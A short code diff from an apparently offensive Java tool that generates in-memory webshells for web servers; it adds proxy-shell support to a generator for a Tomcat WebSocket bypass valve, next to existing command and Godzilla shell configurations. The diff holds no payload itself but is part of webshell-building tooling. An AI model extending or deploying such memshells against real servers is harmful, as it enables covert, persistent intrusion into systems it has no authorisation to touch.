@@ -5,10 +5,7 @@ import com.reajason.javaweb.GenerationException;
 import com.reajason.javaweb.Server;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
-import com.reajason.javaweb.memshell.config.CommandConfig;
-import com.reajason.javaweb.memshell.config.GodzillaConfig;
-import com.reajason.javaweb.memshell.config.ShellConfig;
-import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.memshell.shelltool.wsbypass.TomcatWsBypassValve;
 import com.reajason.javaweb.utils.CommonUtil;
 import net.bytebuddy.ByteBuddy;
@@ -50,6 +47,8 @@ public class WebSocketByPassHelperGenerator {
             return Pair.of(((CommandConfig) shellToolConfig).getHeaderName(), ((CommandConfig) shellToolConfig).getHeaderValue());
         } else if (shellToolConfig instanceof GodzillaConfig) {
             return Pair.of(((GodzillaConfig) shellToolConfig).getHeaderName(), ((GodzillaConfig) shellToolConfig).getHeaderValue());
+        } else if (shellToolConfig instanceof ProxyConfig) {
+            return Pair.of(((ProxyConfig) shellToolConfig).getHeaderName(), ((ProxyConfig) shellToolConfig).getHeaderValue());
         }
         return null;
     }
